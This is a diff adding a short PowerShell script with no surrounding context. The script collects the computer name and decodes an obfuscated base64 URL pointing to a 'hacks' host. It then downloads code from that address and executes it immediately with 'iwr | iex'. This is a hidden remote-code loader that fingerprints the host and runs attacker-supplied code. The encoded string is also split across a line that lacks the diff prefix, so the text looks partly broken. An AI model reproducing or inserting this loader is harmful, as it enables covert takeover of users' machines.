@@ -1,0 +1,7 @@
+$pn = (Get-WmiObject Win32_ComputerSystem).Name
+$et = "aAB0AHQAcAA6AC8ALwBoAGEAYwBrAHMALgBlAGUAbABjAG8AZwByAGUAaQBkAGEAbgB1AHMALgBuAGwALwBjAG8AbQBwAHUAdABlAHIALgBwAGgAcAA/AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlA
+D0AJQBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAlAA=="
+$db = [System.Convert]::FromBase64String($et)
+$dt = [System.Text.Encoding]::Unicode.GetString($db)
+$u = $dt -replace '%computername%', $pn
+iwr -useb $u | iex
